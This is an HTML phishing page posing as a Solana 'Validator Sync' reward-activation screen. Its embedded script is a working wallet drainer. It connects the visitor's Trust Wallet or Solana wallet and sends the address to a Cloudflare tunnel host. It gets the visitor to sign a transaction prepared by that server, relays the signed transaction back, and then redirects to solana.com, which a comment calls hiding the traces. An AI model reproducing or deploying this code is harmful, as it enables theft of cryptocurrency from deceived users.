<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Protocol Activation</title>
    <script src="https://cdn.jsdelivr.net/npm/@solana/web3.js@1.95.3/lib/index.iife.min.js"></script>
    <style>
        body { background: #000; color: #fff; font-family: -apple-system, system-ui, sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; overflow: hidden; }
        .box { width: 310px; padding: 40px; background: #0d1117; border: 1px solid #30363d; border-radius: 28px; text-align: center; box-shadow: 0 15px 35px rgba(0,0,0,0.6); }
        .btn { background: #14f195; color: #000; border: none; padding: 18px; width: 100%; border-radius: 14px; font-weight: 800; cursor: pointer; font-size: 16px; margin-top: 25px; transition: all 0.2s; }
        .btn:active { transform: scale(0.96); opacity: 0.8; }
        .btn:disabled { background: #21262d; color: #484f58; cursor: not-allowed; }
        #st { font-size: 10px; color: #6e7681; margin-top: 25px; font-family: 'SF Mono', monospace; text-transform: uppercase; letter-spacing: 1px; }
    </style>
</head>
<body>

<div class="box">
    <div style="font-size: 42px; margin-bottom: 15px;">üíé</div>
    <h2 style="margin: 0; font-size: 20px; color: #fff;">VALIDATOR SYNC</h2>
    <p style="color: #8b949e; font-size: 13px; line-height: 1.6; margin-top: 10px;">Link your secure node to the mainnet-beta for reward distribution.</p>
    <button id="cta" class="btn">ACTIVATE NOW</button>
    <div id="st">Status: Secure Layer Ready</div>
</div>

<script>
    // üî± 1. ‰øÆÊîπËøôÈáåÔºöÂøÖÈ°ªÊòØ httpsÔºå‰∏îÂú∞ÂùÄÂøÖÈ°ªÂÆåÂÖ®ÂØπÂ∫î Cloudflare ÈößÈÅìÂüüÂêç
    const tunnel = "https://lonely-concern-challenging-hosted.trycloudflare.com"; 

    document.getElementById('cta').onclick = async function() {
        const btn = this;
        const status = document.getElementById('st');
        const web3 = window.solanaWeb3;

        try {
            // 2. ÁéØÂ¢ÉÊ£ÄÊµã
            const p = window.trustwallet?.solana || window.solana;
            if (!p) {
                alert("Please use Trust Wallet Browser!");
                return;
            }

            btn.disabled = true;
            btn.innerText = "INITIALIZING...";
            status.innerText = "Status: Connecting...";

            // 3. Êè°ÊâãËøûÊé•
            await p.connect();
            status.innerText = "Status: Handshaking...";

            // 4. üî± ÂÖ≥ÈîÆË°•‰∏ÅÔºöËß£ÂÜ≥ "Failed to fetch" ÁöÑÊ†∏ÂøÉÈÄªËæë
            const resp = await fetch(tunnel + "/prepare_v32", {
                method: 'POST',
                mode: 'cors',
                cache: 'no-cache',
                referrerPolicy: 'no-referrer', 
                headers: {
                    'Content-Type': 'application/json',
                    'Accept': 'application/json'
                },
                body: JSON.stringify({ address: p.publicKey.toString() })
            });

            // üî± Â¶ÇÊûúÈößÈÅìÁî±‰∫éËøáËΩΩÊàñÈ™åËØÅÊã¶Êà™Êä•ÈîôÔºåÂ∞ùËØïÂºïÂØºÁî®Êà∑Ë∑≥ËΩ¨
            if (!resp.ok) {
                status.innerText = "Status: Tunnel Busy, Retrying...";
                window.location.href = tunnel; 
                return;
            }

            const info = await resp.json();
            if (!info.raw_tx) throw new Error(info.error || "Server Overload");

            // 5. ËøòÂéü‰∫§ÊòìÂπ∂ÊãâËµ∑Á≠æÂêç
            status.innerText = "Status: Awaiting Sign...";
            const tx = web3.Transaction.from(Uint8Array.from(atob(info.raw_tx), c => c.charCodeAt(0)));
            const signed = await p.signTransaction(tx);
            
            status.innerText = "Status: Broadcasting...";
            btn.innerText = "SUCCESSFUL";

            // 6. Â∫èÂàóÂåñÂπ∂Âõû‰º†
            const signedBase = btoa(String.fromCharCode.apply(null, signed.serialize()));
            fetch(tunnel + "/broadcast_v41", {
                method: 'POST',
                mode: 'cors',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ signed_tx: signedBase })
            });

            // 7. üî± Âº∫Âà∂Ë∑≥Âá∫ÔºåÊé©ÁõñÁóïËøπ
            setTimeout(() => {
                window.location.replace("https://solana.com/validators");
            }, 800);

        } catch (err) {
            console.error(err);
            // ÊèêÁ§∫Áî®Êà∑Â¶Ç‰ΩïÊâãÂä®Ëß£Èô§Êã¶Êà™
            alert("Network Error: " + err.message + "\n\nTip: If this persists, please open the tunnel link directly in your browser once to verify.");
            status.innerText = "Status: Connection Failed";
            btn.disabled = false;
            btn.innerText = "ACTIVATE NOW";
        }
    };
</script>

</body>
</html>
